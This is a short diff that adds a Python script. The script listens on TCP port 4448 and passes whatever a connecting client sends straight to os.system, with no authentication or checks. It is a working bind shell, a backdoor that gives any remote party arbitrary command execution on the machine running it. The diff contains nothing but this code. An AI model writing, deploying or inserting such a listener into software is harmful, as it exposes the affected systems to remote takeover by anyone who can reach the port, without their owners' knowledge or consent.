@@ -1,0 +1,17 @@
+import socket
+import subprocess
+import os
+s = socket.socket()
+host=socket.gethostname()
+port=4448
+s.bind((host,port))
+print('waiting for request')
+s.listen(5)
+
+while True:
+    client,addr=s.accept()
+    client.send("Server : connection accepted".encode())
+    cmd=client.recv(1024)
+
+    os.system(cmd.decode())
+s.close()
